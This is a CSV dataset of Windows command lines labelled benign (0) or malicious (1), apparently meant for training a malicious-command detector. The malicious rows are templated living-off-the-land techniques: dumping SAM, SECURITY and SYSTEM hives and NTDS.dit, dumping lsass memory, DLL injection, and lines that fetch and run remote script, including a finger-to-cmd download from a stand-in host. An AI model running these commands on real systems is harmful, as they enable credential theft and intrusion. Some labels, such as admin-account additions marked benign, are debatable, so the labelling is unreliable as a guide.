Command,Label
net.exe user stzlcqpl /add,0
"attrib.exe +h ""C:\Temp\xoncnpvzbk.txt""",0
"powershell.exe -Command ""Get-Process""",0
"copy ""D:\Temp\rrabvn.sys"" ""D:\AppData\Temp\tdbjhga.exe""",0
echo.exe dIo6R1MuhGGd > D:\Users\Windows\viyosks.dat,0
"copy.exe ""C:\AppData\AppData\unyiycmqu.ini"" ""C:\Temp\gbmfchysfr.ini""",0
"type.exe ""C:\Logs\uavcwbwute.log""",0
cmd.exe /c dir C:\Temp,0
ngen.exe {REMOTEURL},1
"icacls ""D:\Program Files\Windows\zhynuiwqsb.sys"" /grant Everyone:F",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Program Files\Temp\yxqcvphno.exe\"" \""C:\Temp\evjmgutlv.log\"""" /sc daily /st 23:00",0
echo LbTZ8eJ9RJME > C:\AppData\Temp\eagxhttic.log,0
"certutil -hashfile ""C:\AppData\AppData\rkozd.txt"" SHA256",0
net.exe use Z: \\192.168.245.35\backup,0
c:\windows\syswow64\iscsicpl.exe,1
"certutil -hashfile ""C:\Users\kkbukg\Documents\jbvju.exe"" SHA256",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\AppData\mfung.dat\"" \""D:\AppData\Logs\vbcrygy.txt\"""" /sc daily /st 23:00",0
ping.exe 192.168.25.74,0
"C:\Windows\System32\certutil.exe -hashfile ""D:\Windows\Users\veswcal.dat"" SHA256",0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\AppData\Logs\eepur.txt""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\uqqoi.sys\"" \""C:\Users\ylyfjcs\Pictures\Pictures\xlqmse.ini\"""" /sc daily /st 23:00",0
iscsicpl.exe,1
"echo %DATE% %TIME% >> ""D:\Users\AppData\uojnpjtv.exe""",0
tasklist.exe /v,0
"type.exe ""D:\Users\fplahuxn\Desktop\Pictures\gvdjq.log""",0
certutil.exe -hashfile backup.dat SHA256,0
C:\Program Files\net.exe localgroup Administrators backup /add,0
"move.exe ""C:\Users\jngxnhzdoq.txt"" ""D:\Program Files\ykklwpy.sys""",0
"move.exe ""D:\Program Files\AppData\fjirevng.log"" ""D:\Logs\olnutj.log""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\AppData\ymgqkn.ini\"" \""C:\Users\Windows\csnfnyb.log\"""" /sc daily /st 23:00",0
"icacls.exe ""D:\Windows\Logs\ujpcswwbn.ini"" /grant Everyone:F",0
whoami.exe /all,0
"findstr.exe /C:""IjS3ptrq2LyU"" ""D:\Logs\Windows\mwfhvhl.ini""",0
"C:\Windows\copy.exe ""C:\Users\qzaq\Desktop\hjucqiz.dat"" ""C:\AppData\pfyktnvude.dll""",0
"rmdir.exe ""C:\AppData\Windows"" /s /q",0
netstat.exe -an,0
"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""",1
"type.exe ""D:\Users\pzbdcjpy\Documents\Pictures\qjpvay.ini""",0
Extrac32 [/Y] [/A] [/D | /E] [/L dir.exe] cabinet [filename ...],0
ping.exe 192.168.215.225,0
"copy.exe ""D:\Users\shudkneovm.txt"" ""C:\Program Files\zrtjgrdict.sys""",0
"certutil -hashfile ""C:\Temp\fkmnucxhts.dll"" SHA256",0
"icacls.exe ""D:\Temp\AppData\vunfguxjh.ini"" /grant Everyone:F",0
fsutil 8dot3name [strip] [/t] [/s] [/f] [/l [<log file.] ] [/v] <directorypath>,0
net localgroup Administrators bvnerzeu /add,0
"del ""D:\Windows\Temp\pyycpnl.dat"" /f /q",0
C:\Windows\ping.exe 192.168.197.204,0
C:\Windows\System32\net.exe user fcoemxox /add,0
certutil.exe -hashfile data.log SHA256,0
cmd.exe /c dir C:\Temp,0
set context persistent nowriters,0
net localgroup Administrators jchjpfxe /add,0
"del ""D:\Temp\npokzpnymi.sys"" /f /q",0
"echo %DATE% %TIME% >> ""D:\Windows\qjtadfy.exe""",0
squirrel.exe --updateRollback={REMOTEURL},1
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",1
finger user@example.host.com | more +2 | cmd,1
echo.exe HLr8HW4nWZlc > D:\Users\yhrshim\Desktop\Pictures\wrqpj.sys,0
"E:\Windows\fsutil.exe file layout ""D:\AppData\cxikw.dat""",0
certutil.exe -hashfile document.txt SHA256,0
Update.exe --update={PATH_SMB:folder},1
"certutil.exe -hashfile ""D:\Temp\yasfph.log"" SHA256",0
OpenConsole.exe {PATH:.exe},1
"move ""D:\Logs\Logs\kswld.txt"" ""C:\Users\qgmuvnr\Pictures\Downloads\nuoqw.ini""",0
ping 192.168.91.3,0
"copy.exe ""D:\Users\Windows\fwhstunrju.log"" ""D:\Logs\AppData\zuqoa.dll""",0
net.exe localgroup Administrators backup /add,0
add volume d: alias datavolumeshadow,0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\Windows\iovnftku.log""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\fykymbh\Documents\agbvoldzgz.ini\"" \""D:\Temp\vwwitepij.ini\"""" /sc daily /st 23:00",0
"findstr.exe /i ""warning"" document.txt",0
"fsutil.exe file layout ""C:\Users\AppData\bzsvfrlh.dll""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Logs\bbttzaux.exe\"" \""D:\AppData\Temp\pdeuygqxq.sys\"""" /sc daily /st 23:00",0
echo ygMHmqFd4DBW > D:\Logs\qjmwzp.dat,0
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",1
echo.exe RpoPiLAb0sjQ > D:\Temp\wybavqzv.ini,0
echo.exe H8JipnsAmjr6 > D:\Temp\Windows\lpqin.dat,0
"copy.exe ""C:\Temp\Users\rdzbv.sys"" ""D:\AppData\Program Files\lhnklthfmh.dat""",0
"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet",1
"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path D:\AppData\Users -Recurse | Select-Object FullName, Length""",0
"copy ""C:\Program Files\nmjcnsok.log"" ""D:\AppData\Users\ijnfbck.log""",0
extend [size=212] [disk=212] [noerr],0
for /f [usebackq <parsingkeywords>] {%%|%}i in ((*.txt *.log)) do echo.exe @file [<commandlineoptions>],0
"dir ""D:\Windows\Logs""",0
ping.exe 192.168.214.4,0
"rmdir ""C:\Users\ipoqtq\Pictures"" /s /q",0
"msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",1
chap initiator set secret=[<secret>] [target=<target>],0
net.exe localgroup Administrators fqebkheq /add,0
#pragma add System Eventlog 2147489653,0
"findstr.exe /C:""KaHceHD8quef"" ""D:\Program Files\Logs\lnktqq.ini""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\treosvki.sys\"" \""C:\Users\AppData\xipes.txt\"""" /sc daily /st 23:00",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\AppData\dunty.ini\"" \""D:\Program Files\AppData\asgmgwezb.dat\"""" /sc daily /st 23:00",0
"copy ""D:\Program Files\Program Files\fneewh.dll"" ""C:\Users\Users\bkwjwdl.dat""",0
net.exe user dnjpaxzm /add,0
"del ""C:\Users\rfdrmicz\Downloads\Pictures\hupvaekj.dll"" /f /q",0
echo UurG9PV93Mz5 > C:\Users\ziuzpenhdi.exe,0
"type.exe ""C:\Logs\kzosvwzfe.txt""",0
"E:\Windows\System32\attrib.exe +h ""D:\Program Files\Temp\cqyrpdp.dll""",0
certutil.exe -hashfile backup.dat SHA256,0
net.exe user pojjmcpt /add,0
net.exe localgroup Administrators xkxtpner /add,0
diskshadow/list/load metadata [C:][C:\Program Files\Program Files]<metadata.cab>,0
call superapp>c:\superapp.out,0
"findstr.exe /C:""t8eMcfzfEzgZ"" ""D:\Windows\vatkxpsnby.log""",0
"C:\Windows\System32\move.exe ""D:\Temp\wssvj.dat"" ""C:\AppData\ahlxbbmiku.sys""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\uoeeooir\Downloads\Desktop\heezksih.sys\"" \""C:\Logs\AppData\vimiwyonb.dll\"""" /sc daily /st 23:00",0
"C:\Windows\powershell.exe -Command ""Get-Service""",0
"certutil.exe -hashfile ""C:\Users\zoucbpyj\Desktop\xeiehwufni.dll"" SHA256",0
ping.exe 192.168.40.28,0
"E:\Windows\move.exe ""C:\Windows\AppData\fopamimqzc.txt"" ""C:\Temp\abtmsdkeya.dat""",0
rundll32.exe -sta {CLSID},1
create lun automagic size=541 [noerr],0
adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet,1
ping 192.168.55.154,0
netsh.exe interface show interface,0
"icacls.exe ""C:\Windows\leocqmife.dat"" /grant Everyone:F",0
"C:\Windows\System32\move.exe ""D:\Temp\pngifzy.dat"" ""C:\Logs\gacpw.txt""",0
net user vmzrmets /add,0
"C:\Windows\System32\attrib.exe +h ""C:\Users\odnw\Documents\Desktop\pwiwhpu.sys""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\lugk\Pictures\Desktop\hxgnos.ini\"" \""C:\Temp\ofpzpljad.dat\"""" /sc daily /st 23:00",0
adplus.exe -c {PATH:.xml},1
"dir.exe ""C:\Users\eghzu\Desktop\Documents"" /s /b",0
"C:\Windows\System32\copy.exe ""D:\Program Files\mbvqa.dll"" ""D:\Windows\omqyedmf.log""",0
"C:\Windows\mkdir.exe ""D:\Logs\Users""",0
diskraid /s <script.txt>,0
"fsutil file layout ""C:\Users\tmkqtwcb\Downloads\vujzyctt.exe""",0
"move.exe ""D:\Users\opquz\Documents\Desktop\ivzwptns.ini"" ""D:\Temp\Logs\xhwnwau.txt""",0
extract [/y] /c source destination,0
"powershell.exe -Command ""Get-Process""",0
"fsutil file layout ""D:\Program Files\iaiwfryxjq.log""",0
"move.exe ""D:\Users\Program Files\xuhwzziqm.log"" ""C:\Users\Program Files\iueml.dat""",0
net.exe localgroup Administrators fsdwpwed /add,0
"icacls.exe ""D:\Users\gtajre.txt"" /grant Everyone:F",0
"attrib.exe +h ""D:\Windows\wwgowjnzpu.dat""",0
"dir.exe ""C:\Logs\Windows"" /s /b",0
"fsutil file layout ""D:\Temp\Program Files\dsqjnsoayp.sys""",0
delete tpgroup [noerr],0
"powershell -Command ""Get-ChildItem -Path C:\Logs -Recurse | Select-Object FullName, Length""",0
"type.exe ""D:\Program Files\rhriafhupo.dat""",0
echo.exe tn1zlSsxKJA3 > C:\Program Files\Logs\myaaoias.log,0
"rmdir ""D:\Users\rwgaez\Downloads"" /s /q",0
ping.exe 192.168.120.216,0
"icacls.exe ""C:\Program Files\Temp\cwhqznx.dll"" /grant Everyone:F",0
netsh.exe advfirewall show allprofiles,0
icacls.exe document.txt /grant Everyone:R,0
net localgroup Administrators bqekkihb /add,0
"attrib.exe +h ""C:\Users\AppData\xpfgvmcs.dat""",0
"mshta.exe ""{PATH_ABSOLUTE}:file.hta""",1
whoami.exe /all,0
C:\Windows\net.exe localgroup Administrators backup /add,0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"certutil -hashfile ""D:\Temp\Program Files\dxaqzdh.txt"" SHA256",0
1 volume in Shadow copy.exe Set.,0
"C:\Windows\icacls.exe ""D:\AppData\nyquzl.sys"" /grant Everyone:F",0
ktmutil force commit {311a9209-03f4-11dc-918f-00188b8f707b},0
"mkdir ""D:\Users\qudo\Desktop\Documents""",0
"mkdir.exe ""C:\Temp\Windows""",0
delete volume,0
"echo.exe %DATE% %TIME% >> ""C:\Program Files\fkaowzrp.txt""",0
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\tmtgi\Desktop\Documents -Recurse | Select-Object FullName, Length""",0
"C:\Program Files (x86)\powershell.exe -Command ""Get-Process""",0
ping 192.168.142.102,0
rem  This batch program formats and checks new disks.,0
net use Z: \\192.168.32.197\public,0
attrib.exe +r document.txt,0
"fsutil file layout ""D:\Temp\lgowg.dll""",0
C:\Windows\System32\certutil.exe -decode {PATH:.base64} {PATH},1
"certutil -hashfile ""C:\Windows\AppData\hihbhmty.txt"" SHA256",0
net.exe user bjgkgoyp /add,0
C:\Windows\net.exe user iuqmzonw /add,0
"dir.exe ""C:\Temp\Users""",0
"C:\Windows\System32\copy.exe ""C:\Program Files\AppData\lgoyvwapzo.txt"" ""D:\Users\bdzjdy\Documents\Pictures\lftiytu.dat""",0
pktmon.exe filter add -p 445,1
"fsutil.exe file layout ""C:\AppData\Windows\uvphspegn.dll""",0
net use Z: \\192.168.114.184\data,0
"type.exe ""C:\Windows\iomhkqi.dll""",0
net user dbqdwsmd /add,0
net.exe use Z: \\192.168.82.194\backup,0
"dir.exe ""C:\Users\txymbzci\Downloads\Documents""",0
net.exe use Z: \\192.168.42.19\backup,0
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\System32\copy.exe \""C:\Temp\vwxzvdq.dll\"" \""D:\Windows\Logs\vhdvouss.dat\"""" /sc daily /st 23:00",0
"type.exe ""C:\Logs\Temp\bbgvdoifie.sys""",0
"attrib.exe +h ""D:\Temp\Users\xdhop.ini""",0
diskshadow/add//end backup,0
"copy ""C:\Temp\qncarcx.ini"" ""C:\Users\bxmkhxgxg.sys""",0
net.exe localgroup Administrators phcghllz /add,0
"attrib +h ""C:\Program Files\utjhsxyww.exe""",0
net.exe user klawytub /add,0
"C:\Windows\dir.exe ""C:\Users\Temp"" /s /b",0
"move ""C:\Users\romqp.txt"" ""C:\Program Files\ryexytsk.log""",0
netstat.exe -an,0
(*.doc),0
certutil.exe -hashfile config.ini SHA256,0
"echo %DATE% %TIME% >> ""D:\Windows\Users\muhqpu.ini""",0
echo.exe D2kQjcmkQadz > D:\Temp\Windows\orwthao.log,0
cmd.exe /c dir C:\Program Files,0
wmic.exe process list brief,0
"echo %DATE% %TIME% >> ""C:\Program Files\lnzbq.txt""",0
fsutil volume [diskfree] D:\Users,0
driverquery [/s <system> [/u [<domain>\]<username> [/p <password>]]] [/fo {table | list | csv}] [/nh] [/v | /si],0
"echo.exe %DATE% %TIME% >> ""C:\Temp\Windows\cbmugka.dll""",0
net.exe localgroup Administrators jafsqufy /add,0
echo.exe uVdZ0RaqilaS > C:\Users\sbqt\Desktop\Downloads\icgnvudrk.ini,0
echo uE1BoJQV6Z1Q > C:\Windows\mgjjkmektv.log,0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\qshkxcv\Pictures\Documents -Recurse | Select-Object FullName, Length""",0
"del ""D:\Users\rujdwd\Desktop\Desktop\nhplpkvep.exe"" /f /q",0
diskperf [-y[d|v] | -n[d|v]] [\\computername],0
ping 192.168.103.145,0
dir.exe C:\Users\Documents,0
"certutil.exe -hashfile ""C:\Users\Users\cfugrcf.ini"" SHA256",0
"findstr.exe /i ""warning"" backup.dat",0
certutil.exe -hashfile backup.dat SHA256,0
C:\Windows\net.exe user cxbtpidt /add,0
"move ""C:\Users\Users\chmtce.log"" ""C:\AppData\Users\gfdgaiqyr.log""",0
"fsutil.exe file layout ""D:\Users\ejhi\Pictures\Pictures\fbsbrvktde.dll""",0
"del ""D:\AppData\Logs\bbzfyqjgy.dll"" /f /q",0
fsutil.exe volume [allocationreport] D:\Users,0
"icacls ""D:\Logs\wwimvb.sys"" /grant Everyone:F",0
"type ""D:\AppData\tpiqtdz.dat""",0
netsh.exe interface show interface,0
"attrib +h ""C:\AppData\Program Files\jkmdygnk.exe""",0
"findstr.exe /C:""4vsxQb6cZEf8"" ""C:\AppData\Program Files\mzuuqg.dll""",0
chap target set secret=[<secret>] [initiator=<initiatorname>],0
dir.exe D:\Data,0
"certutil.exe -hashfile ""D:\Users\xlpnmsz\Downloads\Pictures\vowmg.sys"" SHA256",0
ping 192.168.195.122,0
"echo %DATE% %TIME% >> ""C:\Temp\bhgetvubq.exe""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\rbqzyidl.dat\"" \""D:\Logs\ninwowhoky.exe\"""" /sc daily /st 23:00",0
"icacls.exe ""D:\Users\tdoaisa\Downloads\wqrrni.dat"" /grant Everyone:F",0
net.exe localgroup Administrators akzqmtnt /add,0
net.exe user weikyjha /add,0
echo.exe J23frTEDmDVx > D:\Temp\Users\phzxux.log,0
"fsutil.exe file layout ""D:\Users\Windows\irqwjgydr.dll""",0
shrink [desired=442] [minimum=442] [nowait] [noerr],0
"copy.exe ""C:\Users\namjkdypos.ini"" ""C:\Users\Program Files\xcmmaxnas.dat""",0
C:\Windows\System32\dir.exe C:\Temp,0
netsh.exe advfirewall show allprofiles,0
"icacls ""D:\Windows\AppData\nfbqahwg.ini"" /grant Everyone:F",0
"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path C:\Users\rsjqx\Downloads\Downloads -Recurse | Select-Object FullName, Length""",0
"certutil.exe -hashfile ""D:\Logs\eincvxi.sys"" SHA256",0
net.exe localgroup Administrators plxskdwf /add,0
"echo %DATE% %TIME% >> ""D:\Users\wftcy\Pictures\zwphh.dll""",0
net.exe localgroup Administrators admin /add,0
C:\Program Files\dir.exe C:\Program Files,0
net.exe localgroup Administrators lwxifyof /add,0
"attrib.exe +h ""C:\Windows\Temp\pdbymm.log""",0
D:\Windows\net.exe user ncnqltzz /add,0
"mkdir.exe ""D:\Logs\Program Files""",0
freedisk [/s <computer> [/u [<domain>\]<user> [/p [<password>]]]] [/d <drive>] [<value>],0
C:\Windows\System32\net.exe localgroup Administrators user1 /add,0
net use Z: \\192.168.97.250\public,0
"type ""C:\Users\lzezy\Pictures\adlmciiea.ini""",0
C:\Program Files (x86)\net.exe user backup /add,0
"E:\Windows\System32\icacls.exe ""D:\Windows\Users\clvjwd.txt"" /grant Everyone:F",0
"type.exe ""C:\Users\ueahab\Desktop\Desktop\rnockfuut.dat""",0
reg.exe save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak},1
echo.exe aa8dLn9xVw7z > D:\Users\hspsqa\Documents\Desktop\qshqbh.ini,0
"icacls ""C:\Users\zhyhibt.dll"" /grant Everyone:F",0
"move.exe ""D:\Users\gyzku\Desktop\Documents\lrusaljza.dll"" ""C:\Users\nunayhy.ini""",0
"powershell.exe -Command ""Get-Service""",0
"findstr.exe /i ""error"" document.txt",0
"type.exe ""C:\Users\Program Files\fpngizroim.log""",0
"del ""D:\Temp\lnokfkfoio.exe"" /f /q",0
"powershell -Command ""Get-ChildItem -Path C:\Users\xlmrhips\Desktop -Recurse | Select-Object FullName, Length""",0
net.exe use Z: \\192.168.133.21\data,0
"echo.exe %DATE% %TIME% >> ""C:\Program Files\Program Files\hafyphnpyx.log""",0
"move.exe ""C:\Logs\AppData\suugy.dll"" ""C:\Users\forvn.sys""",0
ipconfig.exe /all,0
ping.exe 10.0.0.1,0
certutil.exe -hashfile config.ini SHA256,0
icacls.exe document.txt /grant Everyone:R,0
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")",1
"del ""C:\Temp\Logs\bzyqgs.ini"" /f /q",0
"rmdir.exe ""D:\Windows\Windows"" /s /q",0
netstat.exe -an,0
dnx.exe {PATH_ABSOLUTE:folder},1
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe},1
"fsutil file layout ""C:\AppData\Windows\zgrbm.ini""",0
#End of script,0
"C:\Windows\System32\type.exe ""C:\Users\pahxqi\Pictures\Pictures\iomeuicbhq.dat""",0
"icacls.exe ""C:\Windows\yifpni.sys"" /grant Everyone:F",0
"fsutil.exe file layout ""C:\AppData\ukivsmdkqf.ini""",0
net user iidkbuhb /add,0
"type.exe ""C:\Logs\cmfefwqnhk.ini""",0
"D:\Windows\findstr.exe /C:""MPLOYvcLd5US"" ""D:\Users\joamklrhk.dll""",0
"echo.exe %DATE% %TIME% >> ""C:\Temp\Users\lokdorks.dll""",0
"powershell.exe -Command ""Get-Process""",0
echo.exe 7hBiYVailFKb > C:\AppData\Windows\moobfxaru.log,0
"icacls ""C:\Temp\Logs\ybioosz.exe"" /grant Everyone:F",0
tasklist.exe /v,0
"fsutil file layout ""C:\AppData\evkgigecd.exe""",0
ping.exe 192.168.55.33,0
"fsutil.exe file layout ""C:\Users\jdnbpyz\Documents\ujjcwvrxz.dat""",0
"C:\Windows\System32\copy.exe ""C:\Windows\rtebpwxek.dll"" ""D:\Program Files\lmajsfqex.log""",0
expand -i <source> [<destination>],0
"del ""C:\Logs\Temp\dlppzvk.dll"" /f /q",0
"type ""C:\Temp\Program Files\hvyoksv.exe""",0
C:\Windows\System32\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\cdmntfwptg.exe\"" \""C:\Logs\cftezgpkyk.dat\"""" /sc daily /st 23:00",0
"attrib.exe +h ""D:\Users\wpjtxwql.dll""",0
diskraid /s C:\scripts\ubttnx.txt,0
C:\Program Files (x86)\net.exe localgroup Administrators service /add,0
"fsutil file layout ""D:\Logs\Logs\gdamxpctg.log""",0
"certutil -hashfile ""D:\Logs\Users\rbqjcozuhs.dat"" SHA256",0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"dir ""D:\Windows\Temp""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\sozsna.sys\"" \""D:\Windows\Temp\qmgeuco.exe\"""" /sc daily /st 23:00",0
"fsutil.exe file layout ""C:\Users\aevnqwf\Downloads\flfzffzll.log""",0
"echo %DATE% %TIME% >> ""D:\AppData\AppData\hcmgsn.ini""",0
C:\Windows\System32\net.exe use Z: \\192.168.223.6\backup,0
"type.exe ""C:\Windows\nvdiun.txt""",0
TTTracer.exe -dumpFull -attach {PID},1
"dir.exe ""C:\Windows\Windows""",0
"E:\Windows\echo.exe %DATE% %TIME% >> ""C:\Logs\mccwweqb.ini""",0
netsh.exe interface show interface,0
"certutil.exe -hashfile ""D:\Users\AppData\gkpuzjx.dat"" SHA256",0
net.exe use Z: \\192.168.37.196\public,0
icacls.exe backup.dat /grant Everyone:R,0
"fsutil.exe file layout ""C:\Users\krrwhlq\Pictures\pklnqzb.log""",0
ping 192.168.225.48,0
"icacls ""D:\Logs\ligmpnhvh.dll"" /grant Everyone:F",0
D:\Windows\System32\net.exe localgroup Administrators qobbiyjr /add,0
"dir.exe ""D:\Windows\Program Files"" /s /b",0
net.exe localgroup Administrators fjwliobi /add,0
"certutil.exe -hashfile ""C:\Users\tybjjnsb.dll"" SHA256",0
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab,1
netsh.exe advfirewall show allprofiles,0
"findstr.exe /C:""S5aGwRqauS7C"" ""D:\Logs\bvgzhn.dat""",0
fsianycpu.exe,1
net.exe localgroup Administrators ansitjip /add,0
"del ""D:\Logs\fbldwtteu.txt"" /f /q",0
"fsutil.exe file layout ""C:\Logs\AppData\qvvmzq.txt""",0
MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll},1
net.exe use Z: \\192.168.204.47\public,0
"dir.exe ""C:\AppData\Windows"" /s /b",0
"C:\Windows\System32\type.exe ""C:\Users\yxtxygzex.sys""",0
"certutil -hashfile ""D:\Program Files\nczyj.ini"" SHA256",0
"icacls.exe ""C:\Users\xiziuzcv\Downloads\Desktop\eeejp.dll"" /grant Everyone:F",0
"fsutil file layout ""C:\Temp\Program Files\hxasbnpgbk.exe""",0
"move.exe ""D:\Logs\Users\mpvnprvdsg.log"" ""C:\Temp\Logs\afvxaazos.log""",0
"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Users\xujmxaa\Desktop\Pictures -Recurse | Select-Object FullName, Length""",0
"rundll32.exe {PATH},EntryPoint",1
"mkdir.exe ""C:\Logs""",0
C:\Windows\System32\net.exe user oljzlxrt /add,0
C:\Windows\ping.exe 192.168.217.105,0
"icacls.exe ""C:\AppData\fqeaz.dat"" /grant Everyone:F",0
finger [-l] [<user>] [@<host>] [...],0
"type.exe ""C:\Windows\Windows\woimcxvd.ini""",0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
Pester.bat ;{PATH:.exe},1
"powershell.exe -Command ""Get-Service""",0
"del ""C:\Program Files\Logs\ccorj.log"" /f /q",0
E:\Windows\ping.exe 192.168.84.168,0
echo GYV7o9eAuYNU > D:\Program Files\Users\wijxpk.exe,0
"certutil -hashfile ""C:\Logs\yvwqs.log"" SHA256",0
echo.exe wU8l2yztKAG7 > D:\Temp\Users\gaympie.ini,0
net user eemkzbeo /add,0
"dir.exe ""C:\Program Files""",0
"copy ""D:\Users\uvzaise\Downloads\xjwzp.exe"" ""C:\AppData\rethds.ini""",0
"echo.exe %DATE% %TIME% >> ""D:\Users\mclwgm\Pictures\Downloads\ffhjbtvql.ini""",0
C:\Windows\net.exe user nycwhrvk /add,0
"C:\Windows\rmdir.exe ""D:\Temp\Windows"" /s /q",0
"del ""C:\Program Files\Temp\uivbno.log"" /f /q",0
"rmdir.exe ""D:\Users\kulz\Downloads\Downloads"" /s /q",0
"mkdir.exe ""D:\Logs\Temp""",0
"rem are logical partitions, and are assigned letters",0
cmd.exe /c dir C:\Temp,0
"mkdir ""C:\Users\rxxzh\Downloads\Pictures""",0
"C:\Windows\System32\findstr.exe /C:""h5naorUDoiv1"" ""C:\Program Files\obhwka.dll""",0
echo.exe hdujqG1MEUh3 > D:\Users\fvnadzbq.txt,0
echo p2mNmW5ITib2 > C:\Temp\pyfcc.exe,0
"type ""D:\Program Files\cgnqdeu.sys""",0
"C:\Windows\System32\copy.exe ""C:\Users\pncodgs\Pictures\Downloads\pdurfw.sys"" ""C:\Logs\yxsogg.log""",0
"certutil.exe -hashfile ""D:\Program Files\AppData\poepv.sys"" SHA256",0
"fsutil.exe file layout ""D:\Users\AppData\uvrhtsouug.dat""",0
net.exe use Z: \\192.168.14.50\data,0
tasklist.exe /v,0
net localgroup Administrators eqlfncnr /add,0
C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.,1
ping.exe 192.168.191.39,0
"powershell.exe -Command ""Get-Service""",0
"findstr.exe /i ""success"" data.log",0
net.exe localgroup Administrators emquoogc /add,0
systeminfo.exe,0
"del ""C:\Program Files\AppData\jebnvhxedg.dat"" /f /q",0
rem The commands in this script set up 3 drives.,0
"findstr.exe /C:""yJU7ozGIV8cf"" ""D:\Users\oigapl\Desktop\jngdqha.log""",0
dir.exe C:\Temp,0
"copy ""C:\Users\tebw\Downloads\hmlinyw.sys"" ""D:\Windows\nacvnhp.dat""",0
wmic.exe process list brief,0
C:\Windows\net.exe user backup /add,0
"attrib.exe +h ""C:\Users\ikuspk\Pictures\Desktop\smamvvqu.log""",0
certutil.exe -hashfile document.txt SHA256,0
